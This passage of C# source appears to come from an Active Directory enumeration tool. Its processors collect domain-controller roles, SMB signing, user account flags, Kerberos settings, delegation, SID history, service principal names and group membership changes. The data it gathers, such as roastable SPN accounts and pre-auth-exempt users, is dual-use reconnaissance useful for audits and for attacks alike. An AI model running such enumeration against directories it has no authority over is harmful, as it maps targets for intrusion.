                case "DomainControllers":
                    return new DomainControllerRecordProcessor();
                case "SchemaHistory":
                    return new SchemaRecordProcessor();
                case "Users":
                    return new UserRecordProcessor();
                case "UserSPNs":
                    return new UserSPNRecordProcessor();
                case "Groups":
                    return new GroupRecordProcessor();
                case "GroupChanges":
                    return new GroupChangeRecordProcessor();
                case "GroupsDictionary":
                    return new GroupRecordDictionaryProcessor();
                case "GroupMembers":
                    return new GroupMemberRecordProcessor();
                case "OUs":
                    return new OURecordProcessor();
                case "GPOs":
                    return new GPORecordProcessor();
                case "GPOsDictionary":
                    return new GPORecordDictionaryProcessor();
                case "SOMs":
                    return new SOMRecordProcessor();
                case "Printers":
                    return new PrinterRecordProcessor();
                case "Computers":
                    return new ComputerRecordProcessor();
                case "ComputerSPNs":
                    return new ComputerSPNRecordProcessor();
                case "LAPS":
                    return new LAPSRecordProcessor();
                case "SIDDictionary":
                    return new SIDRecordDictionaryProcessor();
                case "DACLs":
                    return new DACLRecordProcessor();
                case "SACLs":
                    return new SACLRecordProcessor();
            }
            throw new ArgumentException("Invalid processor type " + name);
        }

        class ProcessorThread
        {
            readonly int id;
            readonly IRecordProcessor recordProcessor;
            readonly IResultsHandler resultsHandler;
            readonly Object[] objectsToBeProcessed;

            public ProcessorThread(int id, IRecordProcessor recordProcessor, IResultsHandler resultsHandler, Object[] objectsToBeProcessed)
            {
                this.recordProcessor = recordProcessor;
                this.id = id;
                this.resultsHandler = resultsHandler;
                this.objectsToBeProcessed = objectsToBeProcessed;
            }

            public void processThreadRecords()
            {
                for (int i = 0; i < objectsToBeProcessed.Length; i++)
                {
                    Object[] result = recordProcessor.processRecord(objectsToBeProcessed[i]);
                    resultsHandler.processResults(result); //this is a thread safe operation
                }
            }
        }

        //The interface and implmentation class used to process a record (this implemmentation just returns a log type string)

        interface IRecordProcessor
        {
            PSObject[] processRecord(Object record);
        }

        class DomainControllerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    System.DirectoryServices.ActiveDirectory.DomainController AdDC = (System.DirectoryServices.ActiveDirectory.DomainController) record;
                    bool? Infra = false;
                    bool? Naming = false;
                    bool? Schema = false;
                    bool? RID = false;
                    bool? PDC = false;
                    string Domain = null;
                    string Site = null;
                    string OperatingSystem = null;
                    PSObject DCSMBObj = new PSObject();

                    try
                    {
                        Domain = AdDC.Domain.ToString();
                        foreach (var OperationMasterRole in (System.DirectoryServices.ActiveDirectory.ActiveDirectoryRoleCollection) AdDC.Roles)
                        {
                            switch (OperationMasterRole.ToString())
                            {
                                case "InfrastructureRole":
                                Infra = true;
                                break;
                                case "NamingRole":
                                Naming = true;
                                break;
                                case "SchemaRole":
                                Schema = true;
                                break;
                                case "RidRole":
                                RID = true;
                                break;
                                case "PdcRole":
                                PDC = true;
                                break;
                            }
                        }
                        Site = AdDC.SiteName;
                        OperatingSystem = AdDC.OSVersion.ToString();
                    }
                    catch (System.DirectoryServices.ActiveDirectory.ActiveDirectoryServerDownException)// e)
                    {
                        //Console.WriteLine("Exception caught: {0}", e);
                        Infra = null;
                        Naming = null;
                        Schema = null;
                        RID = null;
                        PDC = null;
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("Exception caught: {0}", e);
                    }
                    PSObject DCObj = new PSObject();
                    DCObj.Members.Add(new PSNoteProperty("Domain", Domain));
                    DCObj.Members.Add(new PSNoteProperty("Site", Site));
                    DCObj.Members.Add(new PSNoteProperty("Name", Convert.ToString(AdDC.Name).Split('.')[0]));
                    DCObj.Members.Add(new PSNoteProperty("IPv4Address", AdDC.IPAddress));
                    DCObj.Members.Add(new PSNoteProperty("Operating System", OperatingSystem));
                    DCObj.Members.Add(new PSNoteProperty("Hostname", AdDC.Name));
                    DCObj.Members.Add(new PSNoteProperty("Infra", Infra));
                    DCObj.Members.Add(new PSNoteProperty("Naming", Naming));
                    DCObj.Members.Add(new PSNoteProperty("Schema", Schema));
                    DCObj.Members.Add(new PSNoteProperty("RID", RID));
                    DCObj.Members.Add(new PSNoteProperty("PDC", PDC));
                    if (AdDC.IPAddress != null)
                    {
                        DCSMBObj = GetPSObject(AdDC.IPAddress);
                    }
                    else
                    {
                        DCSMBObj = new PSObject();
                        DCSMBObj.Members.Add(new PSNoteProperty("SMB Port Open", false));
                    }
                    foreach (PSPropertyInfo psPropertyInfo in DCSMBObj.Properties)
                    {
                        if (Convert.ToString(psPropertyInfo.Name) == "SMB Port Open" && (bool) psPropertyInfo.Value == false)
                        {
                            DCObj.Members.Add(new PSNoteProperty(psPropertyInfo.Name, psPropertyInfo.Value));
                            DCObj.Members.Add(new PSNoteProperty("SMB1(NT LM 0.12)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB2(0x0202)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB2(0x0210)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB3(0x0300)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB3(0x0302)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB3(0x0311)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB Signing", null));
                            break;
                        }
                        else
                        {
                            DCObj.Members.Add(new PSNoteProperty(psPropertyInfo.Name, psPropertyInfo.Value));
                        }
                    }
                    return new PSObject[] { DCObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class SchemaRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdSchema = (SearchResult) record;

                    PSObject SchemaObj = new PSObject();
                    SchemaObj.Members.Add(new PSNoteProperty("ObjectClass", AdSchema.Properties["objectclass"][0]));
                    SchemaObj.Members.Add(new PSNoteProperty("Name", AdSchema.Properties["name"][0]));
                    SchemaObj.Members.Add(new PSNoteProperty("whenCreated", AdSchema.Properties["whencreated"][0]));
                    SchemaObj.Members.Add(new PSNoteProperty("whenChanged", AdSchema.Properties["whenchanged"][0]));
                    SchemaObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSchema.Properties["distinguishedname"][0]));
                    return new PSObject[] { SchemaObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class UserRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdUser = (SearchResult) record;
                    bool? Enabled = null;
                    bool? CannotChangePassword = null;
                    bool? PasswordNeverExpires = null;
                    bool? AccountLockedOut = null;
                    bool? PasswordExpired = null;
                    bool? ReversiblePasswordEncryption = null;
                    bool? DelegationPermitted = null;
                    bool? SmartcardRequired = null;
                    bool? UseDESKeyOnly = null;
                    bool? PasswordNotRequired = null;
                    bool? TrustedforDelegation = null;
                    bool? TrustedtoAuthforDelegation = null;
                    bool? DoesNotRequirePreAuth = null;
                    bool? KerberosRC4 = null;
                    bool? KerberosAES128 = null;
                    bool? KerberosAES256 = null;
                    string DelegationType = null;
                    string DelegationProtocol = null;
                    string DelegationServices = null;
                    bool MustChangePasswordatLogon = false;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    int? AccountExpirationNumofDays = null;
                    bool PasswordNotChangedafterMaxAge = false;
                    bool NeverLoggedIn = false;
                    bool Dormant = false;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;
                    DateTime? AccountExpires = null;
                    byte[] ntSecurityDescriptor = null;
                    bool DenyEveryone = false;
                    bool DenySelf = false;
                    string SIDHistory = "";
                    bool? HasSPN = null;

                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdUser.Properties["useraccountcontrol"].Count != 0)
                    {
                        var userFlags = (UACFlags) AdUser.Properties["useraccountcontrol"][0];
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                        PasswordNeverExpires = (userFlags & UACFlags.DONT_EXPIRE_PASSWD) == UACFlags.DONT_EXPIRE_PASSWD;
                        AccountLockedOut = (userFlags & UACFlags.LOCKOUT) == UACFlags.LOCKOUT;
                        DelegationPermitted = !((userFlags & UACFlags.NOT_DELEGATED) == UACFlags.NOT_DELEGATED);
                        SmartcardRequired = (userFlags & UACFlags.SMARTCARD_REQUIRED) == UACFlags.SMARTCARD_REQUIRED;
                        ReversiblePasswordEncryption = (userFlags & UACFlags.ENCRYPTED_TEXT_PASSWORD_ALLOWED) == UACFlags.ENCRYPTED_TEXT_PASSWORD_ALLOWED;
                        UseDESKeyOnly = (userFlags & UACFlags.USE_DES_KEY_ONLY) == UACFlags.USE_DES_KEY_ONLY;
                        PasswordNotRequired = (userFlags & UACFlags.PASSWD_NOTREQD) == UACFlags.PASSWD_NOTREQD;
                        PasswordExpired = (userFlags & UACFlags.PASSWORD_EXPIRED) == UACFlags.PASSWORD_EXPIRED;
                        TrustedforDelegation = (userFlags & UACFlags.TRUSTED_FOR_DELEGATION) == UACFlags.TRUSTED_FOR_DELEGATION;
                        TrustedtoAuthforDelegation = (userFlags & UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION) == UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION;
                        DoesNotRequirePreAuth = (userFlags & UACFlags.DONT_REQUIRE_PREAUTH) == UACFlags.DONT_REQUIRE_PREAUTH;
                    }
                    if (AdUser.Properties["msds-supportedencryptiontypes"].Count != 0)
                    {
                        var userKerbEncFlags = (KerbEncFlags) AdUser.Properties["msds-supportedencryptiontypes"][0];
                        if (userKerbEncFlags != KerbEncFlags.ZERO)
                        {
                            KerberosRC4 = (userKerbEncFlags & KerbEncFlags.RC4_HMAC) == KerbEncFlags.RC4_HMAC;
                            KerberosAES128 = (userKerbEncFlags & KerbEncFlags.AES128_CTS_HMAC_SHA1_96) == KerbEncFlags.AES128_CTS_HMAC_SHA1_96;
                            KerberosAES256 = (userKerbEncFlags & KerbEncFlags.AES256_CTS_HMAC_SHA1_96) == KerbEncFlags.AES256_CTS_HMAC_SHA1_96;
                        }
                    }
                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdUser.Properties["ntsecuritydescriptor"].Count != 0)
                    {
                        ntSecurityDescriptor = (byte[]) AdUser.Properties["ntsecuritydescriptor"][0];
                    }
                    else
                    {
                        DirectoryEntry AdUserEntry = ((SearchResult)record).GetDirectoryEntry();
                        ntSecurityDescriptor = (byte[]) AdUserEntry.ObjectSecurity.GetSecurityDescriptorBinaryForm();
                    }
                    if (ntSecurityDescriptor != null)
                    {
                        DirectoryObjectSecurity DirObjSec = new ActiveDirectorySecurity();
                        DirObjSec.SetSecurityDescriptorBinaryForm(ntSecurityDescriptor);
                        AuthorizationRuleCollection AccessRules = (AuthorizationRuleCollection) DirObjSec.GetAccessRules(true,false,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAccessRule Rule in AccessRules)
                        {
                            if ((Convert.ToString(Rule.ObjectType)).Equals("ab721a53-1e2f-11d0-9819-00aa0040529b"))
                            {
                                if (Rule.AccessControlType.ToString() == "Deny")
                                {
                                    string ObjectName = Convert.ToString(Rule.IdentityReference);
                                    if (ObjectName == "Everyone")
                                    {
                                        DenyEveryone = true;
                                    }
                                    if (ObjectName == "NT AUTHORITY\\SELF")
                                    {
                                        DenySelf = true;
                                    }
                                }
                            }
                        }
                        if (DenyEveryone && DenySelf)
                        {
                            CannotChangePassword = true;
                        }
                        else
                        {
                            CannotChangePassword = false;
                        }
                    }
                    if (AdUser.Properties["lastlogontimestamp"].Count != 0)
                    {
                        LastLogonDate = DateTime.FromFileTime((long)(AdUser.Properties["lastlogontimestamp"][0]));
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    else
                    {
                        NeverLoggedIn = true;
                    }
                    if (AdUser.Properties["pwdLastSet"].Count != 0)
                    {
                        if (Convert.ToString(AdUser.Properties["pwdlastset"][0]) == "0")
                        {
                            if ((bool) PasswordNeverExpires == false)
                            {
                                MustChangePasswordatLogon = true;
                            }
                        }
                        else
                        {
                            PasswordLastSet = DateTime.FromFileTime((long)(AdUser.Properties["pwdlastset"][0]));
                            DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                            if (DaysSinceLastPasswordChange > PassMaxAge)
                            {
                                PasswordNotChangedafterMaxAge = true;
                            }
                        }
                    }
                    if (AdUser.Properties["accountExpires"].Count != 0)
                    {
                        if ((Int64) AdUser.Properties["accountExpires"][0] != (Int64) 9223372036854775807)
                        {
                            if ((Int64) AdUser.Properties["accountExpires"][0] != (Int64) 0)
                            {
                                try
                                {
                                    //https://msdn.microsoft.com/en-us/library/ms675098(v=vs.85).aspx
                                    AccountExpires = DateTime.FromFileTime((long)(AdUser.Properties["accountExpires"][0]));
                                    AccountExpirationNumofDays = ((int)((DateTime)AccountExpires - Date1).Days);

                                }
                                catch //(Exception e)
                                {
                                    //    Console.WriteLine("Exception caught: {0}", e);
                                }
                            }
                        }
                    }
                    if (AdUser.Properties["useraccountcontrol"].Count != 0)
                    {
                        if ((bool) TrustedforDelegation)
                        {
                            DelegationType = "Unconstrained";
                            DelegationServices = "Any";
                        }
                        if (AdUser.Properties["msDS-AllowedToDelegateTo"].Count >= 1)
                        {
                            DelegationType = "Constrained";
                            for (int i = 0; i < AdUser.Properties["msDS-AllowedToDelegateTo"].Count; i++)
                            {
                                var delegateto = AdUser.Properties["msDS-AllowedToDelegateTo"][i];
                                DelegationServices = DelegationServices + "," + Convert.ToString(delegateto);
                            }
                            DelegationServices = DelegationServices.TrimStart(',');
                        }
                        if ((bool) TrustedtoAuthforDelegation)
                        {
                            DelegationProtocol = "Any";
                        }
                        else if (DelegationType != null)
                        {
                            DelegationProtocol = "Kerberos";
                        }
                    }
                    if (AdUser.Properties["sidhistory"].Count >= 1)
                    {
                        string sids = "";
                        for (int i = 0; i < AdUser.Properties["sidhistory"].Count; i++)
                        {
                            var history = AdUser.Properties["sidhistory"][i];
                            sids = sids + "," + Convert.ToString(new SecurityIdentifier((byte[])history, 0));
                        }
                        SIDHistory = sids.TrimStart(',');
                    }
                    if (AdUser.Properties["serviceprincipalname"].Count == 0)
                    {
                        HasSPN = false;
                    }
                    else if (AdUser.Properties["serviceprincipalname"].Count > 0)
                    {
                        HasSPN = true;
                    }

                    PSObject UserObj = new PSObject();
                    UserObj.Members.Add(new PSNoteProperty("UserName", (AdUser.Properties["samaccountname"].Count != 0 ? CleanString(AdUser.Properties["samaccountname"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Name", (AdUser.Properties["name"].Count != 0 ? CleanString(AdUser.Properties["name"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                    UserObj.Members.Add(new PSNoteProperty("Must Change Password at Logon", MustChangePasswordatLogon));
                    UserObj.Members.Add(new PSNoteProperty("Cannot Change Password", CannotChangePassword));
                    UserObj.Members.Add(new PSNoteProperty("Password Never Expires", PasswordNeverExpires));
                    UserObj.Members.Add(new PSNoteProperty("Reversible Password Encryption", ReversiblePasswordEncryption));
                    UserObj.Members.Add(new PSNoteProperty("Smartcard Logon Required", SmartcardRequired));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Permitted", DelegationPermitted));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos DES Only", UseDESKeyOnly));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos RC4", KerberosRC4));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos AES-128bit", KerberosAES128));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos AES-256bit", KerberosAES256));
                    UserObj.Members.Add(new PSNoteProperty("Does Not Require Pre Auth", DoesNotRequirePreAuth));
                    UserObj.Members.Add(new PSNoteProperty("Never Logged in", NeverLoggedIn));
                    UserObj.Members.Add(new PSNoteProperty("Logon Age (days)", DaysSinceLastLogon));
                    UserObj.Members.Add(new PSNoteProperty("Password Age (days)", DaysSinceLastPasswordChange));
                    UserObj.Members.Add(new PSNoteProperty("Dormant (> " + DormantTimeSpan + " days)", Dormant));
                    UserObj.Members.Add(new PSNoteProperty("Password Age (> " + PassMaxAge + " days)", PasswordNotChangedafterMaxAge));
                    UserObj.Members.Add(new PSNoteProperty("Account Locked Out", AccountLockedOut));
                    UserObj.Members.Add(new PSNoteProperty("Password Expired", PasswordExpired));
                    UserObj.Members.Add(new PSNoteProperty("Password Not Required", PasswordNotRequired));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Type", DelegationType));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Protocol", DelegationProtocol));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Services", DelegationServices));
                    UserObj.Members.Add(new PSNoteProperty("Logon Workstations", (AdUser.Properties["userworkstations"].Count != 0 ? AdUser.Properties["userworkstations"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("AdminCount", (AdUser.Properties["admincount"].Count != 0 ? AdUser.Properties["admincount"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("Primary GroupID", (AdUser.Properties["primarygroupid"].Count != 0 ? AdUser.Properties["primarygroupid"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("SID", Convert.ToString(new SecurityIdentifier((byte[])AdUser.Properties["objectSID"][0], 0))));
                    UserObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    UserObj.Members.Add(new PSNoteProperty("HasSPN", HasSPN));
                    UserObj.Members.Add(new PSNoteProperty("Description", (AdUser.Properties["Description"].Count != 0 ? CleanString(AdUser.Properties["Description"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Title", (AdUser.Properties["Title"].Count != 0 ? CleanString(AdUser.Properties["Title"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Department", (AdUser.Properties["Department"].Count != 0 ? CleanString(AdUser.Properties["Department"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Company", (AdUser.Properties["Company"].Count != 0 ? CleanString(AdUser.Properties["Company"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Manager", (AdUser.Properties["Manager"].Count != 0 ? CleanString(AdUser.Properties["Manager"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Info", (AdUser.Properties["info"].Count != 0 ? CleanString(AdUser.Properties["info"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Last Logon Date", LastLogonDate));
                    UserObj.Members.Add(new PSNoteProperty("Password LastSet", PasswordLastSet));
                    UserObj.Members.Add(new PSNoteProperty("Account Expiration Date", AccountExpires));
                    UserObj.Members.Add(new PSNoteProperty("Account Expiration (days)", AccountExpirationNumofDays));
                    UserObj.Members.Add(new PSNoteProperty("Mobile", (AdUser.Properties["mobile"].Count != 0 ? CleanString(AdUser.Properties["mobile"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Email", (AdUser.Properties["mail"].Count != 0 ? CleanString(AdUser.Properties["mail"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("HomeDirectory", (AdUser.Properties["homedirectory"].Count != 0 ? AdUser.Properties["homedirectory"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("ProfilePath", (AdUser.Properties["profilepath"].Count != 0 ? AdUser.Properties["profilepath"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("ScriptPath", (AdUser.Properties["scriptpath"].Count != 0 ? AdUser.Properties["scriptpath"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("UserAccountControl", (AdUser.Properties["useraccountcontrol"].Count != 0 ? AdUser.Properties["useraccountcontrol"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("First Name", (AdUser.Properties["givenName"].Count != 0 ? CleanString(AdUser.Properties["givenName"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Middle Name", (AdUser.Properties["middleName"].Count != 0 ? CleanString(AdUser.Properties["middleName"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Last Name", (AdUser.Properties["sn"].Count != 0 ? CleanString(AdUser.Properties["sn"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Country", (AdUser.Properties["c"].Count != 0 ? CleanString(AdUser.Properties["c"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("whenCreated", (AdUser.Properties["whencreated"].Count != 0 ? AdUser.Properties["whencreated"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("whenChanged", (AdUser.Properties["whenchanged"].Count != 0 ? AdUser.Properties["whenchanged"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("DistinguishedName", (AdUser.Properties["distinguishedname"].Count != 0 ? CleanString(AdUser.Properties["distinguishedname"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("CanonicalName", (AdUser.Properties["canonicalname"].Count != 0 ? CleanString(AdUser.Properties["canonicalname"][0]) : "")));
                    return new PSObject[] { UserObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class UserSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdUser = (SearchResult) record;
                    if (AdUser.Properties["serviceprincipalname"].Count == 0)
                    {
                        return new PSObject[] { };
                    }
                    List<PSObject> SPNList = new List<PSObject>();
                    bool? Enabled = null;
                    string Memberof = null;
                    DateTime? PasswordLastSet = null;

                    if (AdUser.Properties["pwdlastset"].Count != 0)
                    {
                        if (Convert.ToString(AdUser.Properties["pwdlastset"][0]) != "0")
                        {
                            PasswordLastSet = DateTime.FromFileTime((long)(AdUser.Properties["pwdLastSet"][0]));
                        }
                    }
                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdUser.Properties["useraccountcontrol"].Count != 0)
                    {
                        var userFlags = (UACFlags) AdUser.Properties["useraccountcontrol"][0];
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                    }
                    string Description = (AdUser.Properties["Description"].Count != 0 ? CleanString(AdUser.Properties["Description"][0]) : "");
                    string PrimaryGroupID = (AdUser.Properties["primarygroupid"].Count != 0 ? Convert.ToString(AdUser.Properties["primarygroupid"][0]) : "");
                    if (AdUser.Properties["memberof"].Count != 0)
                    {
                        foreach (string Member in AdUser.Properties["memberof"])
                        {
                            Memberof = Memberof + "," + ((Convert.ToString(Member)).Split(',')[0]).Split('=')[1];
                        }
                        Memberof = Memberof.TrimStart(',');
                    }
                    foreach (string SPN in AdUser.Properties["serviceprincipalname"])
                    {
                        string[] SPNArray = SPN.Split('/');
                        PSObject UserSPNObj = new PSObject();
                        UserSPNObj.Members.Add(new PSNoteProperty("UserName", (AdUser.Properties["samaccountname"].Count != 0 ? CleanString(AdUser.Properties["samaccountname"][0]) : "")));
                        UserSPNObj.Members.Add(new PSNoteProperty("Name", (AdUser.Properties["name"].Count != 0 ? CleanString(AdUser.Properties["name"][0]) : "")));
                        UserSPNObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                        UserSPNObj.Members.Add(new PSNoteProperty("Service", SPNArray[0]));
                        UserSPNObj.Members.Add(new PSNoteProperty("Host", SPNArray[1]));
                        UserSPNObj.Members.Add(new PSNoteProperty("Password Last Set", PasswordLastSet));
                        UserSPNObj.Members.Add(new PSNoteProperty("Description", Description));
                        UserSPNObj.Members.Add(new PSNoteProperty("Primary GroupID", PrimaryGroupID));
                        UserSPNObj.Members.Add(new PSNoteProperty("Memberof", Memberof));
                        SPNList.Add( UserSPNObj );
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGroup = (SearchResult) record;
                    string ManagedByValue = AdGroup.Properties["managedby"].Count != 0 ? Convert.ToString(AdGroup.Properties["managedby"][0]) : "";
                    string ManagedBy = "";
                    string GroupCategory = null;
                    string GroupScope = null;
                    string SIDHistory = "";

                    if (AdGroup.Properties["managedBy"].Count != 0)
                    {
                        ManagedBy = (ManagedByValue.Split(new string[] { "CN=" },StringSplitOptions.RemoveEmptyEntries))[0].Split(new string[] { "OU=" },StringSplitOptions.RemoveEmptyEntries)[0].TrimEnd(',');
                    }

                    if (AdGroup.Properties["grouptype"].Count != 0)
                    {
                        var groupTypeFlags = (GroupTypeFlags) AdGroup.Properties["grouptype"][0];
                        GroupCategory = (groupTypeFlags & GroupTypeFlags.SECURITY_ENABLED) == GroupTypeFlags.SECURITY_ENABLED ? "Security" : "Distribution";

                        if ((groupTypeFlags & GroupTypeFlags.UNIVERSAL_GROUP) == GroupTypeFlags.UNIVERSAL_GROUP)
                        {
                            GroupScope = "Universal";
                        }
                        else if ((groupTypeFlags & GroupTypeFlags.GLOBAL_GROUP) == GroupTypeFlags.GLOBAL_GROUP)
                        {
                            GroupScope = "Global";
                        }
                        else if ((groupTypeFlags & GroupTypeFlags.DOMAIN_LOCAL_GROUP) == GroupTypeFlags.DOMAIN_LOCAL_GROUP)
                        {
                            GroupScope = "DomainLocal";
                        }
                    }
                    if (AdGroup.Properties["sidhistory"].Count >= 1)
                    {
                        string sids = "";
                        for (int i = 0; i < AdGroup.Properties["sidhistory"].Count; i++)
                        {
                            var history = AdGroup.Properties["sidhistory"][i];
                            sids = sids + "," + Convert.ToString(new SecurityIdentifier((byte[])history, 0));
                        }
                        SIDHistory = sids.TrimStart(',');
                    }

                    PSObject GroupObj = new PSObject();
                    GroupObj.Members.Add(new PSNoteProperty("Name", AdGroup.Properties["samaccountname"][0]));
                    GroupObj.Members.Add(new PSNoteProperty("AdminCount", (AdGroup.Properties["admincount"].Count != 0 ? AdGroup.Properties["admincount"][0] : "")));
                    GroupObj.Members.Add(new PSNoteProperty("GroupCategory", GroupCategory));
                    GroupObj.Members.Add(new PSNoteProperty("GroupScope", GroupScope));
                    GroupObj.Members.Add(new PSNoteProperty("ManagedBy", ManagedBy));
                    GroupObj.Members.Add(new PSNoteProperty("SID", Convert.ToString(new SecurityIdentifier((byte[])AdGroup.Properties["objectSID"][0], 0))));
                    GroupObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    GroupObj.Members.Add(new PSNoteProperty("Description", (AdGroup.Properties["Description"].Count != 0 ? CleanString(AdGroup.Properties["Description"][0]) : "")));
                    GroupObj.Members.Add(new PSNoteProperty("whenCreated", AdGroup.Properties["whencreated"][0]));
                    GroupObj.Members.Add(new PSNoteProperty("whenChanged", AdGroup.Properties["whenchanged"][0]));
                    GroupObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdGroup.Properties["distinguishedname"][0])));
                    GroupObj.Members.Add(new PSNoteProperty("CanonicalName", AdGroup.Properties["canonicalname"][0]));
                    return new PSObject[] { GroupObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupChangeRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGroup = (SearchResult) record;
                    string Action = null;
                    int? DaysSinceAdded = null;
                    int? DaysSinceRemoved = null;
                    DateTime? AddedDate = null;
                    DateTime? RemovedDate = null;
                    List<PSObject> GroupChangesList = new List<PSObject>();

                    System.DirectoryServices.ResultPropertyValueCollection ReplValueMetaData = (System.DirectoryServices.ResultPropertyValueCollection) AdGroup.Properties["msDS-ReplValueMetaData"];

                    if (ReplValueMetaData.Count != 0)
                    {
                        foreach (string ReplData in ReplValueMetaData)
                        {
                            XmlDocument ReplXML = new XmlDocument();
                            ReplXML.LoadXml(ReplData.Replace("\x00", "").Replace("&","&amp;"));

                            if (ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeDeleted"].InnerText != "1601-01-01T00:00:00Z")
                            {
                                Action = "Removed";
                                AddedDate = DateTime.Parse(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeCreated"].InnerText);
                                DaysSinceAdded = Math.Abs((Date1 - (DateTime) AddedDate).Days);
                                RemovedDate = DateTime.Parse(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeDeleted"].InnerText);
                                DaysSinceRemoved = Math.Abs((Date1 - (DateTime) RemovedDate).Days);
                            }
                            else
                            {
                                Action = "Added";
                                AddedDate = DateTime.Parse(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeCreated"].InnerText);
                                DaysSinceAdded = Math.Abs((Date1 - (DateTime) AddedDate).Days);
                                RemovedDate = null;
                                DaysSinceRemoved = null;
                            }

                            PSObject GroupChangeObj = new PSObject();
                            GroupChangeObj.Members.Add(new PSNoteProperty("Group Name", AdGroup.Properties["samaccountname"][0]));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Group DistinguishedName", CleanString(AdGroup.Properties["distinguishedname"][0])));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Member DistinguishedName", CleanString(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["pszObjectDn"].InnerText)));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Action", Action));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Added Age (Days)", DaysSinceAdded));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Removed Age (Days)", DaysSinceRemoved));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Added Date", AddedDate));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Removed Date", RemovedDate));
                            GroupChangeObj.Members.Add(new PSNoteProperty("ftimeCreated", ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeCreated"].InnerText));
